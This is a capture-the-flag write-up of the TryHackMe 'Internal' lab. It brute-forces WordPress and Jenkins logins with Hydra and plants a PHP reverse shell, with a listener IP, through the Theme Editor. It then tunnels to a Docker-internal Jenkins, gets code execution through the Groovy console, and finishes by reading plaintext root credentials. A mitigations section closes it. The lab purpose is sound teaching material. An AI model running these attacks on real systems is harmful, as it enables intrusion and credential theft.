# THM — Internal

```
██╗███╗   ██╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗
██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║
██║██╔██╗ ██║   ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║
██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║
██║██║ ╚████║   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗
╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
              TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 22 (SSH), 80 (HTTP, Apache default page)
- [x] feroxbuster against port 80 → `/blog/` (WordPress 5.4.2), `/phpmyadmin/`
- [x] Added `internal.thm` to `/etc/hosts`
- [x] WPScan enumerated WordPress user: `admin`
- [x] Hydra brute-forced `wp-login.php` → `admin:my2boys`
- [x] WP Theme Editor → planted PHP reverse shell in `404.php`
- [x] Triggered shell via direct theme file path, got `www-data`
- [x] `/opt/wp-save.txt` → plaintext creds `aubreanna:bubb13guM!@#123`
- [x] SSH as `aubreanna`
- [x] `sudo -l` / SUID enumeration → dead end
- [x] `/home/aubreanna/jenkins.txt` → Jenkins running on Docker-internal `172.17.0.2:8080`
- [x] SSH local port forward (`8081` → `172.17.0.2:8080`) to reach Jenkins
- [x] Hydra brute-forced Jenkins login → `admin:spongebob`
- [x] Jenkins Script Console → Groovy RCE as `jenkins` user
- [x] `cat /opt/note.txt` via Groovy → plaintext root creds `root:tr0ub13guM!@#123`
- [x] SSH as root → root flag

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| feroxbuster | Web content and directory discovery |
| WPScan | WordPress user and version enumeration |
| Hydra | Brute force (WordPress login, Jenkins login) |
| pentestmonkey PHP reverse shell | Initial access via WP theme editor |
| SSH local port forwarding | Tunnel Docker-internal Jenkins to attacker |
| Jenkins Groovy Script Console | Remote code execution inside container |

---

## TL;DR

An Apache default page hides a WordPress 5.4.2 install at `/blog/`. WPScan finds the `admin` username, Hydra cracks the password, and WordPress's own Theme Editor becomes the shell vector — editing `404.php` in place sidesteps the upload filter entirely, since the editor writes straight to disk and any extension restriction only applies to the upload form. That lands a `www-data` shell. A plaintext credentials file in `/opt` hands over SSH access as `aubreanna`, and from there a text file in her home directory reveals a Jenkins instance running inside a Docker container, reachable only on the container's internal IP. SSH local port forwarding exposes it, Hydra cracks the Jenkins login, and the built-in Groovy Script Console gives code execution as the `jenkins` user — which is enough to read a plaintext root password left behind in the container's `/opt`.

---

## Introduction

Internal is a multi-stage "black box" box that chains a web app foothold into an internal-network pivot. The name is accurate: the real target isn't the WordPress install at all, it's a Jenkins instance that was never meant to be reachable from outside the host — it's bound to a Docker bridge address that only exists on the box itself.

The room rewards methodical enumeration at every stage rather than any single clever exploit: a directory scan that doesn't stop at the Apache default page, a `grep` through world-readable files after each foothold, and recognizing `docker0` in `ifconfig`/`ip a` output as a sign there's a second network to go looking in.

---

## Recon

### Port Scan

```bash
rustscan -a 10.49.147.221 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC
```

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Two ports. The HTTP title gives away nothing — it's the stock Apache placeholder page. That's a cue to enumerate harder, not a sign the box is empty.

### Web Recon — Port 80

```bash
feroxbuster -u http://10.49.147.221 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,bak,js,json \
  -s 200,301,302,403 \
  -k --scan-dir-listings
```

```
200  GET  http://10.49.147.221/blog/
301  GET  http://10.49.147.221/wordpress/
200  GET  http://10.49.147.221/phpmyadmin/
200  GET  http://10.49.147.221/blog/wp-login.php
```

The default page was a decoy. `/blog/` is a live WordPress 5.4.2 install, `/wordpress/` redirects into it, and `/phpmyadmin/` is sitting there too (never exploited directly — WordPress was the faster path).

Added the virtual host to `/etc/hosts` since WordPress redirects to `internal.thm` internally:

```
10.49.147.221   internal.thm
```

### WordPress Enumeration

```bash
wpscan --url http://internal.thm/blog \
  --enumerate u \
  --plugins-detection aggressive \
  -t 10
```

```
[+] WordPress version 5.4.2 identified (Insecure, released 2020-06-10, 71 known vulnerabilities)

[+] Enumerating Users (via Passive and Aggressive Methods)
[+] user 'admin' found
```

One confirmed username: `admin`. No plugin-based vulnerabilities worth chasing — the login itself is the path in.

---

## Foothold

### Credential Brute Force — WordPress Login

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  internal.thm \
  http-post-form \
  "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fblog%2Fwp-admin%2F&testcookie=1:incorrect" \
  -t 4
```

```
[80][http-post-form] host: internal.thm   login: admin   password: my2boys
```

**Credentials:** `admin:my2boys`

---

## Shell / Initial Access

Logged into `/blog/wp-admin` with `admin:my2boys`. Direct file upload is blocked:

```
php-reverse-shell.php — Sorry, this file type is not permitted for security reasons.
```

Renaming to `.php5` and `.php.html` wasn't tried past a couple of attempts — the **Appearance → Theme Editor** sidesteps the upload filter entirely, since it writes PHP straight to the theme directory on disk rather than going through any upload validation.

**Navigation:** `Appearance → Theme Editor → 404 Template (404.php)`

`404.php` was picked deliberately: low-traffic, unlikely to be hit by normal site browsing, so the shell wouldn't get accidentally triggered or clobbered before it was needed.

Pasted in the [pentestmonkey PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell), pointed at a listener:

```php
$ip = '10.10.14.92';
$port = 4444;
```

```bash
nc -lvnp 4444
```

### Rabbit Hole — Wrong Trigger URL

First attempt to trigger it was `http://internal.thm/blog/404.php`, which just returns WordPress's own 404 page — no code execution. WordPress intercepts the request and renders its 404 template through its own routing before the raw file content is ever touched that way.

The theme file has to be hit directly on disk, bypassing WordPress's router entirely:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

That triggered the listener:

```
www-data@internal:/$
```

Stabilized immediately:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Enumeration as www-data

```bash
ls /home
# aubreanna

ls /home/aubreanna
# ls: cannot open directory '/home/aubreanna': Permission denied

ls /opt
# containerd  wp-save.txt
```

```bash
cat /opt/wp-save.txt
```

```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

World-readable credentials sitting in `/opt` — the second foothold, handed over for free.

---

## Escalation Path

```bash
ssh aubreanna@internal.thm
# Password: bubb13guM!@#123
```

```
aubreanna@internal:~$
```

```bash
sudo -l
# Sorry, user aubreanna may not run sudo on internal.

find / -perm -4000 -type f 2>/dev/null
# standard SUID set only, nothing unusual

getcap -r / 2>/dev/null
# /usr/bin/mtr-packet = cap_net_raw+ep   (not useful)

cat ~/.bash_history
# reset / clear / id / ls / clear / curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
```

`sudo` and SUID are both dead ends. The bash history is the tell — something's being probed on `localhost:8080`.

```bash
grep -ri jenkins /home/aubreanna /opt /var 2>/dev/null
```

```
/home/aubreanna/jenkins.txt:Internal Jenkins service is running on 172.17.0.2:8080
```

```bash
ss -tlnp | grep 8080
# LISTEN  0  128  127.0.0.1:8080  0.0.0.0:*
```

`172.17.0.2` is a Docker bridge address — `docker0` showed up in the SSH login banner (`IP address for docker0: 172.17.0.1`) too. Jenkins is running inside a container, and something is already forwarding `127.0.0.1:8080` toward it on the host — but that local binding is occupied, so a fresh local port is needed to reach it as the attacker.

---

## Exploitation

### Step 1 — Tunnel to Jenkins

```bash
ssh -fN -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

```
bind [127.0.0.1]:8080: Address already in use
channel_setup_fwd_listener_tcpip: cannot listen to port: 8080
```

Port 8080 locally is already in use by this same session's prior forward attempt. Used 8081 instead:

```bash
ssh -fN -L 8081:172.17.0.2:8080 aubreanna@internal.thm
```

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8081
# 403
```

Jenkins is up and reachable through the tunnel.

### Step 2 — Brute Force Jenkins Login

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost \
  http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" \
  -s 8081 -t 4
```

```
[8081][http-post-form] host: localhost   login: admin   password: spongebob
```

**Credentials:** `admin:spongebob`

### Step 3 — Groovy Script Console RCE

**Navigation:** `Manage Jenkins → Script Console` (`/script`)

Confirmed code execution as the Jenkins process user:

```groovy
def p = ['sh','-c','id'].execute()
println p.text
```

```
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

Read the note Will left in the container for Aubreanna:

```groovy
println "cat /opt/note.txt".execute().text
```

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
```

Root credentials, recovered without ever needing a full interactive shell inside the container.

### Step 4 — Root

```bash
ssh root@internal.thm
# Password: tr0ub13guM!@#123
```

```
root@internal:~#
```

---

## Rabbit Holes

**`cve-2026-87902-poc` against the WordPress install:** Tried a published CVE proof-of-concept against the blog before falling back to brute force. It ran but found nothing (`[-] no published page found`). The CVE angle was a dead end; straightforward credential brute force against `wp-login.php` was the actual path in.

**Direct file upload for the reverse shell:** Spent time trying `.php5` and `.php.html` extensions to get the upload form to accept the PHP reverse shell before switching to the Theme Editor, which bypasses the upload filter entirely by writing to disk directly.

**Triggering the shell at `/blog/404.php`:** The intuitive URL for a "404 template" is to hit a page that returns a 404. That just renders WordPress's own 404 page through its router — no code runs. The theme file has to be requested directly from its path under `wp-content/themes/`, bypassing WordPress's request handling altogether.

**Probing `localhost:8080` before the forward was properly set up:** Got a `403` and briefly treated it as a trap or honeypot rather than confirmation that something real (Jenkins) was listening behind it. Pivoted to systematic privesc enumeration first, which is how the `jenkins.txt` hint got found — then came back to the port with more context.

---

## Flag

| Flag | Value |
|---|---|
| User | `THM{int3rna1_fl4g_1}` |
| Root | `THM{d0ck3r_d3str0y3r}` |

---

## Mitigations

**WordPress admin panel reachable with password-only auth:** A brute-forceable admin password turned directly into a code-execution primitive via the Theme Editor. WordPress admin logins should sit behind MFA or at minimum an IP allowlist / rate limiting, and the Theme/Plugin Editor should be disabled in `wp-config.php` (`DISALLOW_FILE_EDIT`) on any production install.

**Plaintext credentials in world-readable locations:** Both pivots in this box — `aubreanna`'s SSH password and the root password — were recovered from plaintext notes left in `/opt`, readable by any local user. Credentials belong in a secrets manager, never in a text file with default permissions.

**Jenkins Script Console reachable with a weak password:** The Groovy console is, by design, full remote code execution for anyone who can authenticate. It should be disabled outright on anything but a locked-down admin workstation, and if it must stay enabled, Jenkins should enforce strong authentication and should not be reachable even from other containers on the same host without an explicit need.

**Docker-internal services treated as implicitly trusted:** Jenkins was bound to a container-internal IP with no additional authentication expected because it "wasn't externally reachable." Any host-level compromise — exactly what happened here — erases that boundary instantly. Internal network segmentation should not substitute for authentication on the service itself.

---

## Key Takeaway

The big lesson here is that "internal-only" is not a security control once the perimeter is breached once. Jenkins trusted its Docker-bridge binding as sufficient isolation, but a single WordPress credential-stuffing success gave `www-data`, which led to `aubreanna`, who had SSH access, which is all it took to reach the "internal" Jenkins over a loopback forward. Defense needs to assume lateral movement is possible and authenticate every service on its own merits, not on the assumption that nothing malicious already has a foothold on the host.

The secondary pattern worth remembering: WordPress's Theme/Plugin Editor is functionally an authenticated webshell dropper built into core. Any time file-upload restrictions are blocking a shell, check whether an in-app code editor exists that writes to disk without going through that same validation path.

---

## If I Did It Again

Skip the CVE proof-of-concept attempt entirely — a 71-vulnerability-count WordPress version with a known admin username is a brute-force target first, not a research target. Go straight to Hydra against `wp-login.php`.

Once in `wp-admin`, go straight for the Theme Editor instead of fighting the upload filter with extension tricks. It's faster and it's the intended path for any WordPress box with no active security plugin.

For the Jenkins pivot, the moment `docker0` and a `172.17.x.x` reference show up anywhere — login banner, `.bash_history`, a stray text file — immediately `grep -ri` common internal-service keywords (`jenkins`, `gitlab`, `tomcat`, `portainer`) across the user's home and `/opt`/`/var` rather than guessing at ports. That's what actually surfaced the hint here, just later than it needed to.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-06 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
